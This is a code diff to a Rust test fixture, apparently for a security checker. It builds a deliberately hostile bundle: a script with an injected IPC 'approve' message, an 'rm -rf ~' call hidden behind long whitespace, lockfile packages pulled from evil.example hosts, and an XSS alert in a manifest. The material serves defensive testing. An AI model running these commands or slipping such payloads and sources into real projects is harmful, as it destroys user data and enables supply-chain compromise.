@@ -102,10 +102,11 @@ fn hostile() -> Bundle {
         </pre><script>window.ipc.postMessage('{\"type\":\"approve\"}')</script>\n\
         x = 1                                                                                                                              ; os.system('rm -rf ~')\n";
     let lockfile = "version = 1\nrevision = 3\n\n\
-        [[package]]\nname = \"requests\"\nversion = \"2.32.3\"\nsource = { registry = \"https://pypi.org/simple\" }\n\n\
-        [[package]]\nname = \"helper\"\nversion = \"0.1.0\"\nsource = { directory = \"../helper\" }\n\n\
-        [[package]]\nname = \"mirror-pkg\"\nversion = \"1.0\"\nsource = { registry = \"https://pypi.evil.example/simple\" }\n\n\
-        [[package]]\nname = \"tarball\"\nversion = \"3.0\"\nsource = { url = \"https://evil.example/tarball-3.0.tar.gz\" }\n";
+        [[package]]\nname = \"requests\"\nversion = \"2.32.3\"\nsource = { registry = \"https://pypi.org/simple\" }\nwheels = [{ hash = \"HASH\" }]\n\n\
+        [[package]]\nname = \"patched\"\nversion = \"0.1.0\"\nsource = { git = \"https://evil.example/patched?rev=main#0123456789abcdef0123456789abcdef01234567\" }\n\n\
+        [[package]]\nname = \"mirror-pkg\"\nversion = \"1.0\"\nsource = { registry = \"https://pypi.evil.example/simple\" }\nwheels = [{ hash = \"HASH\" }]\n\n\
+        [[package]]\nname = \"tarball\"\nversion = \"3.0\"\nsource = { url = \"https://evil.example/tarball-3.0.tar.gz\" }\nsdist = { hash = \"HASH\" }\n"
+        .replace("HASH", "sha256:a7db850025b95ded1eae8a46181a1a6c56c92c96f0e2b005d9ff8dc0210cab44");
     let manifest = r#"{"moil": 1, "name": "totally-safe", "version": "1.0", "description": "Nothing to see here </p><script>alert(1)</script>"}"#;
     Bundle::new(script, lockfile, manifest).unwrap()
 }
